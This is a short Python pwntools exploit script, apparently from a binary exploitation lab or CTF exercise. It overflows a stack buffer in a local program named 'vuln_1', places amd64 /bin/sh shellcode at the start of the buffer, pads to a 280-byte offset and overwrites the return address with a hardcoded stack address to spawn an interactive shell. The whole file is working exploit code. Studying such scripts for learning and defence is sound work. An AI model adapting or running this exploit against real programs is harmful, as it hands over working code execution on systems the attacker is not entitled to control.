#!/usr/bin/env python3 

from pwn import *

# overflow offset at 280 or 0x118 bytes
rip_offset = 0x118

# set new instruction pointer to point to the start of the buffer
rip_new = 0x7fffffffcda0

# set architecture for pwntools to be 64 bit
context.update(arch="amd64")

# craft shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# shellcode
payload = shellcode

# Add padding between shellcode and overflow offset (280).
payload += b"A" * (rip_offset - len(shellcode))

# pack new return address(start of the buffer) to little endian format and attach to the end of the payload
payload += p64(rip_new)

# connect to the vulnerable program
p = process("../../vuln_1")

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y/n")

p.interactive()
